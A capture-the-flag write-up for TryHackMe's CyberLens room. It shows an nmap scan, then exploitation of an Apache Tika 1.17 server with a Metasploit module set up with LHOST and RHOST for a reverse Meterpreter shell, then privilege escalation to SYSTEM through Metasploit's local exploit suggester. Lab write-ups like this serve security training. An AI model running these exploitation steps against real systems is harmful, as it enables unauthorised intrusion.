---
title: "CyberLens"
date: 2025-03-25
draft: false
summary: "Writeup for CyberLens CTF challenge on TryHackMe."
tags: ["windows", "rce"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/cyberlens/cover.webp"
  caption: "CyberLens TryHackMe Challenge"
  alt: "CyberLens cover"
platform: "TryHackMe"
---

Can you exploit the CyberLens web server and discover the hidden flags?
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/cyberlensp6

## Reconnaissance

I added an entry for the IP in my `/etc/hosts` file. I then performed an **nmap** aggressive scan to find open ports and the services running on it:

```shell
nmap -A -p- -Pn TARGET --min-rate 10000 -oN cyberlens.nmap
```

| Port  | Service |
| ----- | ------- |
| 80    | http    |
| 135   | rpc     |
| 139   | netbios |
| 445   | smb     |
| 3389  | rdp     |
| 5985  | winrm   |
| 7680  | unknown |
| 47001 | winrm   |
| 49664 | rpc     |
| 49665 | rpc     |
| 49666 | rpc     |
| 49667 | rpc     |
| 49668 | rpc     |
| 49669 | rpc     |
| 49670 | rpc     |
| 49675 | rpc     |
| 61777 | http    |

![](https://cdn.ziomsec.com/cyberlens/1.webp)

![](https://cdn.ziomsec.com/cyberlens/2.webp)

## Initial Foothold

The **nmap** scan revealed an **http** server running on port 80 and 61777 so I accessed them from my browser.

![](https://cdn.ziomsec.com/cyberlens/3.webp)

![](https://cdn.ziomsec.com/cyberlens/4.webp)

The server running on port 61777 revealed the apache version being used. A simple google search revealed an **RCE** vulnerability.

I looked for exploits using **searchsploit** and found one on **metasploit**.

```shell
searchsploit 'tika 1.17'
```

![](https://cdn.ziomsec.com/cyberlens/5.webp)

I booted the **metasploit** framework and selected the exploit.

```shell
msfdb run
use exploit/windows/http/apache_tika_jp2_jscript
```

I configured the options and ran the exploit to get remote code execution.

```shell
set LHOST LISTENER_IP
set RHOST TARGET
set RPORT 61777
run
```

![](https://cdn.ziomsec.com/cyberlens/6.webp)

I then captured the user flag from the `C:\Users\CyberLens\Desktop\`.

```shell
cd C:\Users\CyberLens\Desktop
more user.txt
```

![](https://cdn.ziomsec.com/cyberlens/7.webp)

## Privilege Escalation

I then ran privilege escalation checks using **PowerUp** and **winPEAS** but found nothing interesting.

![](https://cdn.ziomsec.com/cyberlens/8.webp)

Since both of them revealed nothing of interest, I ran the local exploit suggester module in metasploit.

```shell
bg
use post/multi/recon/local_exploit_suggester
set SESSION <Number>
```

![](https://cdn.ziomsec.com/cyberlens/9.webp)

I after getting a bunch of recommendations, I tried each one of them one after the other. Starting with the first exploit, I configured the required options.

Running it got me root access on the target.

![](https://cdn.ziomsec.com/cyberlens/10.webp)

Finally I captured the root flag from the *Administrator's* Desktop.

![](https://cdn.ziomsec.com/cyberlens/11.webp)

## Closure

Here's a short summary of how I pwned CyberLens:
- An **nmap** scan revealed an Apache server running on port 61777
- Further reconnaissance revealed an RCE vulnerability for the version running on it.
- I exploited the vulnerability using **metasploit** and got a meterpreter shell.
- I used metasploit's post module to get exploit suggestions for privilege escalation.
- I used one of the suggested post exploit to escalate my privilege and get NT Authority/System access.

That's it from my side! Until next time :)

---
